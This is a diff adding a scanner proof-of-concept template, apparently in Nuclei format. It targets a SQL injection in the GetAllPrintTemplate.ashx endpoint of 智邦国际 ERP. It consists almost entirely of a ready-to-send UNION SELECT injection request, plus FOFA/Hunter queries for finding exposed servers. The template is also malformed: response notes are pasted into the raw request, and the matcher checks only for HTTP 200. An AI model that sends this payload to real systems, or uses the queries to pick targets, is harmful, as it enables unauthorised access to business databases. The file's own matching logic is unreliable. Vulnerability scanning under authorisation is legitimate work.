@@ -1,0 +1,34 @@
+id: poc-fdy5b7p8qi9rkd09
+info:
+  name: 智邦国际-GetAllPrintTemplate-SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/fdy5b7p8qi9rkd09'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: fdy5b7p8qi9rkd09
+    fofa: hunter:app.name="智邦国际 ERP" fofa:body="/SYSN/"
+http:
+- raw:
+  - 'GET /SYSN/json/pcclient/GetAllPrintTemplate.ashx?sort=12+UNION+ALL+SELECT+NULL,NULL,char(115)%2Bchar(99)%2Bchar(97)%2Bchar(109)%2Bchar(97)%2Bchar(103)%2Bchar(105)%2Bchar(99),NULL-- HTTP/1.1
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    scamagic
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
